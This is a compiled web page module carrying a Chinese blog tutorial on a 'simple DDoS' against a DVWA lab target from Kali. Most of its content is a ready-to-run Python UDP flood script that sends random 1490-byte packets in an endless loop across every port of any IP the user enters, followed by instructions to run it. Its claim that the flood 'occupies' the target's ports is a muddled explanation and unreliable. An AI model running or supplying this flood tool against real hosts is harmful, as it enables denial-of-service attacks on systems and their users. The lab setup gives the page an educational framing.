import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{o as s,c as a,e}from"./app-21d4bb55.js";const p={},t=e(`<p>这个其实就很简单了，就是通过占用靶机的所有端口从而让外界无法访问。</p><h2 id="准备工作" tabindex="-1"><a class="header-anchor" href="#准备工作" aria-hidden="true">#</a> 准备工作</h2><p>首先在虚拟机中搭建了centos7做为靶机，部署dvwa，端口80；然后部署了kali系统作为攻击机。</p><blockquote><p>DVWA 简介</p><p>DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web 应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p><p>DVWA 一共包含了十个攻击模块，分别是：Brute Force（暴力（破解））、Command Injection（命令行注入）、CSRF（跨站请求伪造）、- File Inclusion（文件包含）、File Upload（文件上传）、Insecure CAPTCHA （不安全的验证码）、SQL Injection（SQL注入）、SQL Injection（Blind）（SQL盲注）、XSS（Reflected）（反射型跨站脚本）、XSS（Stored）（存储型跨站脚本）。包含了 OWASP TOP10 的所有攻击漏洞的练习环境，一站式解决所有 Web 渗透的学习环境。</p><p>另外，DVWA 还可以手动调整靶机源码的安全级别，分别为 Low，Medium，High，Impossible，级别越高，安全防护越严格，渗透难度越大。一般 Low 级别基本没有做防护或者只是最简单的防护，很容易就能够渗透成功；而 Medium 会使用到一些非常粗糙的防护，需要使用者懂得如何去绕过防护措施；High 级别的防护则会大大提高防护级别，一般 High 级别的防护需要经验非常丰富才能成功渗透；最后 Impossible 基本是不可能渗透成功的，所以 Impossible 的源码一般可以被参考作为生产环境 Web 防护的最佳手段</p></blockquote><h2 id="写攻击代码" tabindex="-1"><a class="header-anchor" href="#写攻击代码" aria-hidden="true">#</a> 写攻击代码</h2><p>用python写一段代码，用来访问靶机，轮询访问靶机所有端口，发送字节流，造成靶机端口被占用，实现ddos攻击的目的：</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> time
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> random
 
 
sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span>
<span class="token comment"># 指定长度的bytes对象</span>
<span class="token builtin">bytes</span> <span class="token operator">=</span> random<span class="token punctuation">.</span>_urandom<span class="token punctuation">(</span><span class="token number">1490</span><span class="token punctuation">)</span>
 
<span class="token comment"># 获取目标靶机，域名也是可以的</span>
ip <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;IP Target: &quot;</span><span class="token punctuation">)</span>
 
<span class="token comment"># 设置起始端口</span>
port <span class="token operator">=</span> <span class="token number">1</span>
 
<span class="token comment"># 等三秒</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
sent <span class="token operator">=</span> <span class="token number">0</span>
 
<span class="token comment"># 开始循环遍历端口</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    sock<span class="token punctuation">.</span>sendto<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sent <span class="token operator">=</span> sent <span class="token operator">+</span> <span class="token number">1</span>
    port <span class="token operator">=</span> port <span class="token operator">+</span> <span class="token number">1</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;攻击</span><span class="token interpolation"><span class="token punctuation">{</span>ip<span class="token punctuation">}</span></span><span class="token string">次, port:</span><span class="token interpolation"><span class="token punctuation">{</span>port<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
 
    <span class="token comment"># 遍历完了，把端口恢复到1</span>
    <span class="token keyword">if</span> port <span class="token operator">==</span> <span class="token number">65534</span><span class="token punctuation">:</span>
        port <span class="token operator">=</span> <span class="token number">1</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="执行代码" tabindex="-1"><a class="header-anchor" href="#执行代码" aria-hidden="true">#</a> 执行代码</h2><p>保存文件为<code>ddos.py</code>，然后运行：<code>python ddos.py</code>，输入目标IP即可。</p><p>这个时候再访问DVWA就不能访问啦，因为端口被占用掉了，不过因为现在的电脑性能都不错所以直接不能访问的情况还是比较少滴，这里只是相当于模拟了一下~</p>`,10),o=[t];function i(c,l){return s(),a("div",null,o)}const d=n(p,[["render",i],["__file","实现一次普通的DDos.html.vue"]]);export{d as default};
